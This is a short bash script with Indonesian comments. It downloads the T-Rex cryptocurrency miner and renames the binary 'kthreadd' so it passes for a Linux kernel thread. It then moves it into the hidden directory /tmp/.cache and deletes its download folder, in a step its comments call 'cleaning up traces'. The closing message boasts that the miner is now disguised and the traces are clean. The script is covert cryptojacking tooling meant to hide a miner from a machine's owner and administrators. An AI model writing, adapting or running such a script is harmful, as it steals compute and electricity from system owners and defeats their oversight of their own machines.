#!/bin/bash

# Setup
URL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
ARCHIVE="t-rex-0.26.8-linux.tar.gz"
WORKDIR="PANEN"
MINER_NAME="t-rex"
NEW_NAME="kthreadd"
DEST="/tmp/.cache"

# Buat folder kerja
mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit

# Download dan ekstrak
wget -q --show-progress "$URL"
tar -xf "$ARCHIVE"

# Rename dan pindah
mv "$MINER_NAME" "$NEW_NAME"
mkdir -p "$DEST"
mv "$NEW_NAME" "$DEST/"

# Bersih-bersih jejak
cd ..
rm -rf "$WORKDIR"

echo "Done sayang! Minernya udah nyamar jadi $DEST/$NEW_NAME dan jejaknya udah bersih~"
